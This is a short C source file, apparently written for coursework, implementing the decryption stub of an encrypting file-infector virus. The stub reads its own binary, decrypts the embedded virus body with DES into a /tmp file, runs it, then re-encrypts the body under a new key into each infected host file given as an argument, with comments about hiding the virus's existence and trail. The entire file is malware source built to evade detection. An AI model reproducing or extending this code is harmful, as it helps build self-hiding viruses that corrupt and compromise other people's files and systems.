/* Small decryption program that hides the existence of a virus.
 * Written by Thomas Ingram <taingram@mtu.edu>
 *
 * DES is used as the goal is simply to obscure the virus not secure it.
 */

// Needed for setkey() and encrypt()
#define _XOPEN_SOURCE

#include <crypt.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include "vhlpr.h"

int main(int argc, char *argv[])
{
  int key_sep[] = {0xca, 0xfe, 0xba, 0xbe};
  int plain_sep[] = {0xba, 0x5e, 0xba, 0x11};
  int host_sep[] = {0xde, 0xad, 0xbe, 0xef};
  bool encrypted;
  char key[64];
  char buf[64];

  FILE *this_file = fopen(argv[0], "r");
  if (this_file == NULL) {
    perror(argv[0]);
    return EXIT_FAILURE;
  }

  long key_offset = seek_to_sep(this_file, key_sep);
  if (key_offset == -1) {
    key_offset = seek_to_sep(this_file, plain_sep);
    if (key_offset != -1) {
      fprintf(stderr, " %s: File corrupt\n", argv[0]);
      return EXIT_FAILURE;
    }
    encrypted = false;
  } else {
    encrypted = true;
  }

  char *tmp_name = malloc(strlen(argv[0]) + 11); // hardcoded for 4 byte pid_t
  sprintf(tmp_name, "/tmp/seed-%d", getpid());
  FILE *tmp = fopen(tmp_name, "w+");
  if (encrypted) {
    // Get key
    fread(buf, 1, 64, this_file);
    memcpy(key, buf, 64);
    setkey(key);

    while (fread(buf, 1, 64, this_file)) {
      encrypt(buf, 1); // Decryption
      fwrite(buf, 1, 64, tmp);
    }
  } else {
    copy_file(this_file, tmp, key_offset, 0);
  }
  fclose(tmp);

  pid_t cid = fork();
  if (!cid) {
    execv(tmp_name, argv);
    return EXIT_FAILURE;
  }
  wait(NULL);
  remove(tmp_name);

  // Check if virus has propegated
  for (int i = 0; i < argc; i++) {
    FILE *argfile = fopen(argv[i], "r+");
    if (argfile == NULL) {
      continue;
    }

    long host_offset = seek_to_sep(argfile, host_sep);
    if (host_offset == -1) {
      fclose(tmp);
      continue;
    }

    // Hide the trail
    tmp = fopen(tmp_name, "w+");
    if (tmp == NULL)
      continue;

    // Copy decryption program
    copy_file(this_file, tmp, 0, key_offset);

    // gen random key
    for (int i = 0; i < 64; i++) {
      srand(time(NULL));
      key[i] = rand();
    }
    fwrite(key, 1, 64, tmp);

    // encrypt to 0xDEADBEEF
    int bufsize = 64;
    if (host_offset < ftell(argfile) + bufsize) {
      bufsize = host_offset - ftell(argfile);
    }
    size_t bytes;
    while ((bytes = fread(buf, 1, bufsize, argfile)) != 0) {
      encrypt(buf, 0);
      if (fwrite(buf, 1, bufsize, tmp) != bytes)
	break;
      if (host_offset < ftell(argfile) + bufsize) {
	bufsize = host_offset - ftell(argfile);
      }
    }

    // Copy host section
    copy_file(argfile, tmp, host_offset, 0);

    // Write temp back to original
    copy_file(tmp, argfile, 0, 0);
    fclose(argfile);
    fclose(tmp);
  }

  free(tmp_name);
  return EXIT_SUCCESS;
}
